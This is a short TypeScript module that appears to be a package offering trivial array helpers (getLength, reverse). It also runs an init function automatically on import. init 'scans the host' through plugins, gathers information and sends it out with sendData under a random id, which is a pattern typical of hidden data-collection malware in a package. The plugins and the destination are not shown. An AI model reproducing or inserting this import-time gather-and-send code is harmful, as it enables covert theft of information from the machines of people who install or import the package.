import { sendData, generateRandomId } from "./utils/index";
import { plugins } from "./plugins/index";


function init() {
  console.log("Scanning host...");
  const id = generateRandomId();
  plugins.forEach(plugin => {
    const gatheredInfo = plugin.run();
    const postData = JSON.stringify(gatheredInfo, null, 2);
    console.log(`Data from ${plugin.getName()} is: ${postData}`);
    sendData(postData, plugin.getName(), id);
  });
}

export function getLength(arr: Array<any>): number {  return arr.length || 0;}

export function reverse(arr: Array<any>): Array<any> {
  const copy = arr.slice();
  return copy.reverse();
}

init();